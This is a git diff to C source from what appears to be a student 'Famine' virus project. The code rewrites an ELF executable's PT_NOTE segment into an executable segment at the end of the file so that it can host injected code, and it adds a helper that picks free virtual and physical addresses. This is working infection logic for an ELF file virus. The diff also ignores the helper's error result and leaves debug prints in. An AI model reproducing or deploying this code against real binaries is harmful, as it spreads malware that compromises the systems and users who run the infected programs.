@@ -6,13 +6,14 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/11/06 09:45:03 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/06 11:26:34 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/06 11:50:05 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
 
 static Elf64_Phdr	*exec_segment(elf_data *data);
+static bool	find_pvaddr(elf_data *data, Elf64_Phdr *note, size_t new_seg_size);
 
 //	Changes the first PT_NOTE segment into an executable segment that will host our code
 //
@@ -63,13 +64,53 @@ bool	change_note_segment(profiling *this, elf_data *data) {
 	exec = exec_segment(data);
 
 	//	Changing the values of the PT_NOTE header
-	note->p_vaddr = 0x20000;
-	note->p_paddr = 0x20000;
+	find_pvaddr(data, note, new_seg_size);
 	note->p_flags = PF_R | PF_X;
 	note->p_filesz += this->size + SIGNATURE_OFFSET + SIGNATURE_LEN;
 	note->p_memsz = note->p_filesz;
 	note->p_offset = data->mmap_size;
 	note->p_align = exec->p_align;
+
+	return false;
+}
+
+static bool	find_pvaddr(elf_data *data, Elf64_Phdr *note, size_t new_seg_size) {
+	Elf64_Phdr	*seg = NULL;
+	size_t		vmax = 0;
+	size_t		pmax = 0;
+	size_t		current = 0;
+
+	for (size_t i = 0; i < data->elf->e_phnum; i++) {
+		seg = &data->segments[i];
+	
+		current =  seg->p_vaddr + seg->p_filesz;
+		current += seg->p_align - (current % seg->p_align);
+		if (current > vmax) {
+			vmax = current;
+		}
+		
+		current =  seg->p_paddr + seg->p_filesz;
+		current += seg->p_align - (current % seg->p_align);
+		if (current > pmax) {
+			pmax = current;
+		}
+	}
+
+	current = vmax + new_seg_size;
+	if (current < vmax) {
+		printf("vmax + new_seg_size overflowed\n");
+		return true;
+	}
+	current = pmax + new_seg_size;
+	if (current < pmax) {
+		printf("pmax + new_seg_size overflowed\n");
+		return true;
+	}
+
+	note->p_vaddr = vmax;
+	note->p_paddr = pmax;
+
+	printf("vaddr: %lx | paddr: %lx\n", note->p_vaddr, note->p_paddr);
 
 	return false;
 }
